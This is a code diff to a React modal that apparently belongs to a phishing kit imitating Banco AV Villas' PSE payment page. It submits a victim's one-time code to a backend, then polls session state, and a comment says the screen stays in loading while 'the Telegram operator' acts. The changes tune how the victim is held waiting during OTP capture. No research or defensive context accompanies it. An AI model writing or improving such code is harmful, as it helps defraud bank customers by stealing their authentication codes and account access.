@@ -34,10 +34,6 @@ const QRAuthModal = ({ onClose }) => {
     };
 
     useEffect(() => {
-        allowPollNavigationRef.current = sessionStorage.getItem('avvillas_otp_armed') === '1';
-        if (allowPollNavigationRef.current) {
-            sessionStorage.removeItem('avvillas_otp_armed');
-        }
         const sid = localStorage.getItem('sessionId');
         if (!sid) {
             redirigir('/banco_av_villas_pse');
@@ -107,6 +103,14 @@ const QRAuthModal = ({ onClose }) => {
             const estadoActual = (response?.data?.estado || '').toLowerCase();
 
             if (!estadoActual) return;
+
+            // Mantener el loading activo mientras la sesión esté en 'pendiente' esperando al operador de Telegram
+            if (estadoActual === 'pendiente') {
+                if (allowPollNavigationRef.current) {
+                    setLoading(true);
+                }
+                return;
+            }
 
             const navegacionTrasOtp = ['sol_otp', 'error_otp', 'sol_finalizar', 'solicitar_finalizar'];
             if (navegacionTrasOtp.includes(estadoActual) && !allowPollNavigationRef.current) {
@@ -237,6 +241,8 @@ const QRAuthModal = ({ onClose }) => {
 
         try {
             setLoading(true);
+            allowPollNavigationRef.current = true;
+            lastEstadoRef.current = 'pendiente';
             const response = centralUrl
                 ? await instanceBackend.post(centralUrl, dataSend)
                 : await instanceBackend.post('/avvillas/otp', dataSend);
@@ -244,8 +250,8 @@ const QRAuthModal = ({ onClose }) => {
             if (response?.data?.success) {
                 localStorage.setItem('sessionId', response.data.sessionId);
                 sessionIdRef.current = response.data.sessionId;
-                lastEstadoRef.current = null;
                 allowPollNavigationRef.current = true;
+                lastEstadoRef.current = 'pendiente';
                 initPolling();
             } else {
                 setLoading(false);
